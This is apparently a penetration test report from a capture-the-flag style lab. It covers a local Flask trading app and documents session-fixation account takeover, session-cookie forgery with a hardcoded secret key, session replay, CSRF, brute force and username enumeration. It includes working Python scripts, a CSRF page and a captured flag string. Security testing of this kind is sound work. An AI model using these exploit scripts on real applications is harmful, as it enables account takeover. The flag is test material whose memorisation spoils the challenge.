# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:33611
- **Assessment Date:** October 30, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Successfully exploited 7 critical authentication vulnerabilities including session fixation (AUTH-VULN-01), session cookie forgery via weak secret key (AUTH-VULN-02), deterministic session generation (AUTH-VULN-03), session replay after logout (AUTH-VULN-04), CSRF via missing SameSite cookie flag (AUTH-VULN-08), unlimited brute force opportunities (AUTH-VULN-10), and username enumeration (AUTH-VULN-11). The most severe finding is the session fixation vulnerability at routes.py:55-56 which allows complete authentication bypass by manipulating a client-controlled user_id parameter. Impact: Complete account takeover, unauthorized access to any user account including the flag user (ID 10001), and flag extraction.

**Authorization Vulnerabilities:**
Successfully exploited 1 critical authorization vulnerability: horizontal privilege escalation via session fixation (AUTHZ-VULN-01). This vulnerability allows an attacker to authenticate with valid test credentials (test:test) but manipulate a hidden form field to assume any user's identity without knowing their password. The application sets session user_id based on client-supplied input without validation, enabling trivial account takeover. Impact: Complete horizontal privilege escalation from test user to flag user, bypassing all access controls.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application uses Jinja2 templating with auto-escaping enabled, which successfully mitigates reflected XSS attacks. While an anti-pattern exists (passing unsanitized error parameter to templates at routes.py:21), the framework's default protections prevent exploitation.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. All database queries use SQLAlchemy ORM with parameterized queries, providing robust protection against SQL injection. No system command execution functions are used in the application, eliminating command injection attack surface.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application has no HTTP client libraries in its dependencies, performs no external service integrations, and uses only internal database communication. All redirect operations use Flask's url_for() with hardcoded internal route names, not user-controlled URLs.

## Network Reconnaissance

**Open Ports and Services:**
- Port 80/tcp: Caddy httpd (external)
- Port 8081/tcp: Apache httpd 2.4.56 (Debian) - Hosts "Submit a username" page
- Port 33611/tcp: **Primary target** - Trading Platform application (Apache 2.4.65 with Flask backend)
- Port 9999/tcp: Unknown service with permissive CORS headers (Access-Control-Allow-Origin: *)
- Port 49152/tcp: Golang net/http server (Tailscale) - Requires authentication, returns 401 Unauthorized
- Port 443/tcp: SSL/HTTPS available but not configured for application
- Port 631/tcp: CUPS 2.3 (printer service)

**Security-Relevant Findings:**
- **Wildcard CORS configured** on port 9999 service - allows any origin to access resources
- **Tailscale service** on port 49152 has strong security headers: Content-Security-Policy with 'none' directives, X-Frame-Options: DENY, X-Content-Type-Options: nosniff
- **No HTTPS/TLS** on main application port 33611 - all traffic including credentials transmitted in plaintext
- **MySQL 5.7.15** used internally - End-of-Life version no longer receiving security patches
- **Apache 2.4.65** serving main application with mod_wsgi

**Subdomain Discoveries:**
Multiple subdomains discovered via subfinder scan, though most appear to be generic enumeration results not specific to this deployment: mail.localhost, owa.regency.localhost, autodiscover.localhost, and several mail/server subdomains across various .localhost domains. Only localhost:33611 actively hosts the target application.

**Security Header Analysis:**
- Application missing critical security headers: Strict-Transport-Security (HSTS), X-Frame-Options, X-Content-Type-Options, Content-Security-Policy (CSP)
- Conflicting Cache-Control directives observed (routes.py:10 sets secure no-cache but line 13 overwrites with weaker 'public, max-age=0')
- Wildcard CORS header detected: Access-Control-Allow-Origin: * (enables cross-site attacks)

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Session Fixation via Client-Controlled user_id (Horizontal Privilege Escalation)

**Summary:**
- **Vulnerable location:** POST /password/<username> (routes.py:55-56)
- **Overview:** Application accepts user_id from client-controlled hidden form field without validating it matches the authenticated username, enabling trivial horizontal privilege escalation to any user account
- **Impact:** Complete authentication bypass - attacker can impersonate any user (including flag user ID 10001) by authenticating with valid test credentials but submitting arbitrary user_id value
- **Severity:** Critical

**Prerequisites:**
- Known valid credentials (test:test)
- Browser with developer tools OR HTTP proxy (Burp, ZAP, mitmproxy)

**Exploitation Steps:**

1. Navigate to http://localhost:33611/

2. Enter username "test" and click Login
   - Request: POST / with body: username=test
   - Response: 302 redirect to /password/test

3. Observe password form containing hidden fields:
   ```html
   <input name="user_id" value="10032" hidden>
   <input name="username" value="test" hidden>
   ```

4. Modify the hidden user_id field from "10032" to "10001" (flag user ID) using browser DevTools:
   ```javascript
   document.getElementById('user_id').value = '10001';
   ```

5. Enter password "test" and submit the form
   - Request: POST /password/test
   - Body: username=test&password=test&user_id=10001
   - Server validates password for test user (PASSES)
   - Server checks if user_id=10001 exists in database (YES - flag user exists)
   - Server sets session['user_id'] = '10001' WITHOUT validating it matches authenticated user

6. Automatically redirected to /dashboard

7. Dashboard displays flag user's data:
   ```
   Welcome, Flag FLAG{b5b4759907706b68a92b4ae6015033897f29c0ea134d8a59a412d36aab2456e0}
   ```

**Proof of Impact:**
Successfully accessed flag user (ID 10001) dashboard without knowing their password. Flag extracted:
```
FLAG{b5b4759907706b68a92b4ae6015033897f29c0ea134d8a59a412d36aab2456e0}
```

**Notes:**
This is an Insecure Direct Object Reference (IDOR) vulnerability at the authentication layer (CWE-639). The application blindly trusts client-supplied user_id parameter despite having just authenticated a different username. Attack requires only modifying a hidden form field - no advanced tools needed.

---

### AUTH-VULN-02: Session Cookie Forgery via Weak Secret Key

**Summary:**
- **Vulnerable location:** Flask secret key configuration (__init__.py:11)
- **Overview:** Flask secret_key is hardcoded as 'your_secret_key', enabling complete session forgery using itsdangerous library
- **Impact:** Complete authentication bypass without any credentials - attacker can forge valid session cookies for any user_id
- **Severity:** Critical

**Prerequisites:**
- Python 3 with itsdangerous library installed
- Knowledge of Flask session structure (documented in security research)

**Exploitation Steps:**

1. Install itsdangerous library (if not already installed):
   ```bash
   pip install itsdangerous
   ```

2. Create Python script to forge session cookie:
   ```python
   from itsdangerous import URLSafeTimedSerializer
   import hashlib

   # Known weak secret key from __init__.py:11
   secret_key = 'your_secret_key'
   salt = 'cookie-session'  # Flask default for session cookies

   # Create serializer with Flask's exact configuration
   serializer = URLSafeTimedSerializer(
       secret_key,
       salt=salt,
       signer_kwargs={
           'key_derivation': 'hmac',
           'digest_method': hashlib.sha1
       }
   )

   # Forge session for flag user (ID 10001)
   payload = {"user_id": "10001"}
   forged_cookie = serializer.dumps(payload)

   print(f"Forged cookie: {forged_cookie}")
   ```

3. Execute the script to generate forged cookie:
   ```
   Forged cookie: eyJ1c2VyX2lkIjoiMTAwMDEifQ.aQP9Nw.o2B3uNfeMZSaU6p858HSTBfWZA8
   ```

4. Set the forged cookie and access dashboard:
   ```bash
   curl -b "session=eyJ1c2VyX2lkIjoiMTAwMDEifQ.aQP9Nw.o2B3uNfeMZSaU6p858HSTBfWZA8" \
        http://localhost:33611/dashboard
   ```

5. Server accepts forged cookie as valid and returns dashboard for flag user

**Proof of Impact:**
Successfully accessed flag user dashboard without any prior authentication. Response includes:
```html
<h5 class="card-title">Welcome, Flag FLAG{b5b4759907706b68a92b4ae6015033897f29c0ea134d8a59a412d36aab2456e0}</h5>
```

Flag extracted:
```
FLAG{b5b4759907706b68a92b4ae6015033897f29c0ea134d8a59a412d36aab2456e0}
```

**Notes:**
The weak secret key has only 3.19 bits of entropy (vs required 256+ bits). Flask's client-side session mechanism uses HMAC-SHA1 signature with this key. Anyone with the secret key can forge arbitrary session cookies. The session payload is only signed, not encrypted, so user_id values are readable via base64 decoding.

---

### AUTH-VULN-03: Deterministic Session Cookie Generation

**Summary:**
- **Vulnerable location:** Session creation mechanism (routes.py:56)
- **Overview:** Multiple logins for the same user within the same second generate identical session cookies due to timestamp-based determinism
- **Impact:** Session prediction and hijacking possible in high-volume environments or with precise timing
- **Severity:** Medium

**Prerequisites:**
- Ability to trigger multiple authentication attempts
- Timing precision to execute within same second

**Exploitation Steps:**

1. Perform multiple rapid logins as test user:
   ```python
   import requests
   import re

   def login():
       s = requests.Session()
       s.post('http://localhost:33611/', data={'username': 'test'})
       resp = s.get('http://localhost:33611/password/test')
       user_id = re.search(r'name="user_id" value="(\d+)"', resp.text).group(1)
       s.post('http://localhost:33611/password/test',
              data={'username': 'test', 'password': 'test', 'user_id': user_id})
       return s.cookies.get('session')

   # Login 3 times rapidly
   cookie1 = login()
   cookie2 = login()
   cookie3 = login()
   ```

2. Compare resulting session cookies:
   ```
   Login #1: eyJ1c2VyX2lkIjoiMTAwMzIifQ.aQP9WQ.zuojq2WeyTHBQ56EDqVwjomj-W4
   Login #2: eyJ1c2VyX2lkIjoiMTAwMzIifQ.aQP9WQ.zuojq2WeyTHBQ56EDqVwjomj-W4
   Login #3: eyJ1c2VyX2lkIjoiMTAwMzIifQ.aQP9WQ.zuojq2WeyTHBQ56EDqVwjomj-W4

   All cookies identical: True
   ```

**Proof of Impact:**
Successfully demonstrated that sessions are deterministic. Multiple logins within the same second (elapsed time: 0.048 seconds) produced identical session cookies. This confirms Flask's timestamp-based signing creates predictable sessions.

**Notes:**
Combined with AUTH-VULN-02 (weak secret key), an attacker can forge sessions for any timestamp. The attack window is narrow (1-second granularity) but exploitable in high-volume applications where multiple users log in simultaneously. No session.regenerate() call exists at routes.py:56.

---

### AUTH-VULN-04: Session Replay After Logout (Insufficient Session Expiration)

**Summary:**
- **Vulnerable location:** Logout endpoint (routes.py:36-40)
- **Overview:** Logout only removes user_id from session cookie client-side but doesn't invalidate the session server-side; old cookies remain valid indefinitely
- **Impact:** Saved session cookies can be replayed after logout to regain access; useful for session restoration, shared device exploitation, stolen cookie persistence
- **Severity:** High

**Prerequisites:**
- Previously authenticated session cookie
- Ability to store and replay HTTP cookies

**Exploitation Steps:**

1. Login as test user and save the session cookie:
   ```python
   import requests
   import re

   # Login normally
   session = requests.Session()
   session.post('http://localhost:33611/', data={'username': 'test'})
   resp = session.get('http://localhost:33611/password/test')
   user_id = re.search(r'name="user_id" value="(\d+)"', resp.text).group(1)
   session.post('http://localhost:33611/password/test',
                data={'username': 'test', 'password': 'test', 'user_id': user_id})

   # Save cookie BEFORE logout
   saved_cookie = session.cookies.get('session')
   print(f"Saved cookie: {saved_cookie}")
   ```

2. Verify dashboard access with active session:
   ```python
   resp = session.get('http://localhost:33611/dashboard')
   # Response: "Welcome, John" (authenticated)
   ```

3. Logout:
   ```python
   session.post('http://localhost:33611/logout')
   # Cookie cleared client-side
   ```

4. Verify logout worked (should redirect to login):
   ```python
   resp = session.get('http://localhost:33611/dashboard', allow_redirects=False)
   # Response: 302 redirect to / (logged out)
   ```

5. EXPLOITATION - Replay the saved cookie:
   ```python
   new_session = requests.Session()
   new_session.cookies.set('session', saved_cookie)
   resp = new_session.get('http://localhost:33611/dashboard')
   # Response: "Welcome, John" (re-authenticated!)
   ```

**Proof of Impact:**
Successfully regained access to dashboard using saved session cookie after logout. The old cookie remains cryptographically valid because:
1. Flask uses client-side sessions (no server-side state)
2. HMAC signature is still valid
3. No session revocation list exists
4. No session expiration timestamp

**Notes:**
The logout implementation at routes.py:39 only does `session.pop('user_id', None)` which creates a new empty session cookie but doesn't invalidate the old one. Flask's client-side session mechanism provides no server-side revocation capability. Attack is particularly useful for persistent access after credential changes or shared device scenarios.

---

### AUTH-VULN-08: CSRF via Missing SameSite Cookie Flag

**Summary:**
- **Vulnerable location:** Flask session cookie configuration (__init__.py - missing SESSION_COOKIE_SAMESITE setting)
- **Overview:** Session cookies lack SameSite flag, allowing cross-site request forgery attacks; no CSRF token validation on any POST endpoints
- **Impact:** Attacker can force logout of authenticated users from malicious websites; other state-changing actions possible without user consent
- **Severity:** Medium

**Prerequisites:**
- Ability to host malicious HTML page
- Victim user must visit attacker's page while authenticated

**Exploitation Steps:**

1. Create malicious HTML page with auto-submitting form:
   ```html
   <!DOCTYPE html>
   <html>
   <body>
       <h1>CSRF Attack Demo</h1>
       <form id="csrf" action="http://localhost:33611/logout" method="POST">
       </form>
       <script>
           document.getElementById('csrf').submit();
       </script>
   </body>
   </html>
   ```

2. Verify session cookie flags lack SameSite protection:
   ```python
   import requests

   # Login and examine cookie
   session = requests.Session()
   # ... (login flow)

   for cookie in session.cookies:
       if cookie.name == 'session':
           print(f"SameSite: {cookie.get_nonstandard_attr('SameSite', 'Not set')}")
           # Output: SameSite: Not set
   ```

3. Demonstrate CSRF attack:
   ```python
   # User is logged in
   resp = session.get('http://localhost:33611/dashboard')
   # Shows: "Welcome, John"

   # Simulate cross-site POST (from malicious website)
   session.post('http://localhost:33611/logout')

   # User is now logged out
   resp = session.get('http://localhost:33611/dashboard', allow_redirects=False)
   # Shows: 302 redirect (logged out)
   ```

**Proof of Impact:**
Successfully demonstrated CSRF forced logout. Cookie analysis confirms:
- HttpOnly: True (JavaScript can't access - good)
- Secure: False (sent over HTTP - bad)
- SameSite: Not set (vulnerable to CSRF - bad)

Performed cross-site POST to /logout without CSRF token, successfully logging out the user.

**Notes:**
All POST endpoints lack CSRF protection:
- POST / (username submission)
- POST /password/<username> (password submission)
- POST /logout (session termination)

While forced logout is low impact, the missing SameSite flag combined with no CSRF tokens could enable more serious attacks if additional state-changing endpoints existed. The application should set `app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'` in __init__.py.

---

### AUTH-VULN-10: Unlimited Brute Force (No Rate Limiting)

**Summary:**
- **Vulnerable location:** All authentication endpoints (routes.py:19-32, 44-66)
- **Overview:** Complete absence of rate limiting, CAPTCHA, account lockout, or brute force protection mechanisms
- **Impact:** Unlimited password guessing attempts; credential stuffing and password spraying attacks unrestricted; no detection of ongoing attacks
- **Severity:** High

**Prerequisites:**
- None (application accepts unlimited requests from any source)

**Exploitation Steps:**

1. Perform rapid brute force attack:
   ```python
   import requests
   import re
   import time

   session = requests.Session()
   attempts = 50
   passwords = ['wrong1', 'wrong2', 'wrong3', 'wrong4', 'wrong5'] * 10

   start_time = time.time()

   for i, pwd in enumerate(passwords[:attempts]):
       # Submit username
       session.post('http://localhost:33611/', data={'username': 'flag'})

       # Get password page
       resp = session.get('http://localhost:33611/password/flag')
       user_id = re.search(r'name="user_id" value="(\d+)"', resp.text).group(1)

       # Submit password
       session.post('http://localhost:33611/password/flag',
                   data={'username': 'flag', 'password': pwd, 'user_id': user_id})

   elapsed = time.time() - start_time
   print(f"Completed {attempts} attempts in {elapsed:.2f}s")
   print(f"Rate: {attempts/elapsed:.1f} attempts/second")
   ```

2. Observe results:
   ```
   Completed 50 attempts in 0.51 seconds
   Rate: 98.9 attempts/second
   ```

**Proof of Impact:**
Successfully performed 50 failed authentication attempts in 0.51 seconds (98.9 attempts/second) without any rate limiting, account lockout, or CAPTCHA challenges. No failed_attempts field exists in User model (models.py:5-11). No Flask-Limiter dependency in requirements.txt.

**Notes:**
While brute forcing the flag user's 100-character random password is infeasible (62^100 combinations), this vulnerability enables:
- Credential stuffing with leaked password databases
- Password spraying common passwords across users
- Enumeration attacks without throttling
- No detection or alerting of ongoing attacks

Combined with AUTH-VULN-06 (weak password policy) and AUTH-VULN-11 (username enumeration), this creates perfect conditions for compromising accounts with weak passwords.

---

### AUTH-VULN-11: Username Enumeration via Differential Responses

**Summary:**
- **Vulnerable location:** Login endpoint (routes.py:19-32) and password page (routes.py:44-49)
- **Overview:** Application reveals username existence through different HTTP responses, error messages, and first name disclosure
- **Impact:** Attackers can systematically enumerate all valid usernames; targeted attacks focus on confirmed accounts; social engineering enhanced with first name knowledge
- **Severity:** Medium

**Prerequisites:**
- None (publicly accessible endpoint)

**Exploitation Steps:**

1. Test various usernames to identify differential responses:
   ```python
   import requests

   test_usernames = ['test', 'flag', 'admin', 'root', 'nonexistent123']

   for username in test_usernames:
       resp = requests.post('http://localhost:33611/',
                           data={'username': username},
                           allow_redirects=False)

       if resp.status_code == 302:
           location = resp.headers.get('Location')
           print(f"✓ '{username}': VALID (302 → {location})")
       elif 'User not found' in resp.text:
           print(f"✗ '{username}': INVALID (200 with error)")
   ```

2. Observe differential responses:
   ```
   ✓ 'test': VALID (302 → /password/test)
   ✓ 'flag': VALID (302 → /password/flag)
   ✗ 'admin': INVALID (200 with error)
   ✗ 'root': INVALID (200 with error)
   ✗ 'nonexistent123': INVALID (200 with error)
   ```

3. Extract additional information from password pages:
   ```python
   for username in ['test', 'flag']:
       resp = requests.get(f'http://localhost:33611/password/{username}')
       import re
       first_name = re.search(r'Welcome, ([^!]+)!', resp.text)
       if first_name:
           print(f"'{username}' → First name: {first_name.group(1)}")
   ```

4. Results:
   ```
   'test' → First name: John
   'flag' → First name: Flag
   ```

**Proof of Impact:**
Successfully enumerated valid usernames through:
1. **HTTP status codes**: Valid usernames return 302 redirect, invalid return 200 OK
2. **Error messages**: Invalid usernames show "User not found" message
3. **First name disclosure**: Password page reveals user's first name in welcome message

Enumerated accounts: test, flag

**Notes:**
Multiple enumeration vectors exist:
- routes.py:28 redirects on valid username vs routes.py:30 renders error on invalid
- Direct GET /password/<username> shows "Welcome, <FirstName>!" for valid users (routes.py:47)
- Different error messages distinguish "User not found" from "Incorrect password"
- Timing differences may also leak information (0.0045s invalid vs 0.0068s valid observed)

No protection against automated enumeration exists. Combined with AUTH-VULN-10 (no rate limiting), attacker can enumerate entire username space.

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Session Fixation via Client-Controlled user_id (Horizontal Privilege Escalation)

**Summary:**
- **Vulnerable location:** POST /password/<username> (routes.py:55-56)
- **Overview:** Complete authentication bypass through session fixation - attacker authenticates with valid credentials (test:test) but manipulates a client-controlled hidden form field (user_id) to assume any user's identity, bypassing password authentication for the target account
- **Impact:** Complete account takeover of flag user (ID 10001), unauthorized access to sensitive data, flag extraction
- **Severity:** CRITICAL

**Prerequisites:**
- Valid credentials for any account (test:test is publicly known)
- Knowledge of target user ID (10001 for flag user)
- Ability to manipulate HTTP requests via browser DevTools or proxy

**Exploitation Steps:**

1. **Navigate to the login page**
   ```
   URL: http://localhost:33611/
   ```

2. **Submit test username to reach password page**
   - Enter username: `test`
   - Click "Login" button
   - Application redirects to: `http://localhost:33611/password/test`

3. **Identify the hidden user_id field**
   - The password form contains a hidden field: `<input name="user_id" value="10032" type="text" hidden>`
   - Current value is 10032 (test user's ID)
   - This field is sent to the server during password submission

4. **Modify the hidden user_id field to target the flag user**
   - Open browser DevTools (F12) or use a proxy
   - Execute JavaScript to change the hidden field value:
   ```javascript
   document.querySelector('input[name="user_id"]').value = '10001';
   ```
   - Verify the field now contains: `10001` (flag user's ID)

5. **Submit the password form with manipulated user_id**
   - Enter password: `test`
   - Click "Login" button
   - Server validates password for test user (authentication succeeds)
   - Server accepts the manipulated user_id=10001 and sets session['user_id']=10001
   - Application redirects to: `http://localhost:33611/dashboard`

6. **Access flag user's dashboard and extract flag**
   - Dashboard displays flag user's data
   - Page title: "Dashboard - Trading Platform"
   - Welcome message shows: **"Welcome, Flag FLAG{b5b4759907706b68a92b4ae6015033897f29c0ea134d8a59a412d36aab2456e0}"**

**Proof of Impact:**

**Flag Captured:** `FLAG{b5b4759907706b68a92b4ae6015033897f29c0ea134d8a59a412d36aab2456e0}`

**Evidence of Complete Privilege Escalation:**
- Authenticated as test user (ID 10032) with password "test"
- Manipulated session creation to set user_id=10001 (flag user)
- Successfully accessed flag user's dashboard without knowing flag user's password
- Retrieved sensitive data (flag value) stored in flag user's last_name field
- Complete horizontal privilege escalation: test user → flag user

**Technical Root Cause:**
The application's password authentication endpoint (routes.py:55-56) contains a critical flaw:
```python
if User.query.get(request.form['user_id']):  # Line 55 - Only checks ID exists
    session['user_id'] = request.form['user_id']  # Line 56 - Trusts client input
```

The server validates the username/password combination for the test user but then accepts a client-controlled `user_id` parameter and directly assigns it to the session without verifying that the authenticated user's ID matches the requested user_id. This violates the fundamental security principle that session identity must be server-determined based on authentication, not client-supplied.

**CWE Classification:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Notes:**
- The dashboard endpoint itself is NOT independently vulnerable - it correctly checks for authenticated sessions
- The vulnerability exists in the session creation logic, not the session validation logic
- This is a horizontal privilege escalation (accessing another user's data at the same privilege level)
- All authenticated users have identical privileges (no role-based access control exists)
- Exploitation requires only basic browser tools (DevTools) - no specialized hacking tools needed
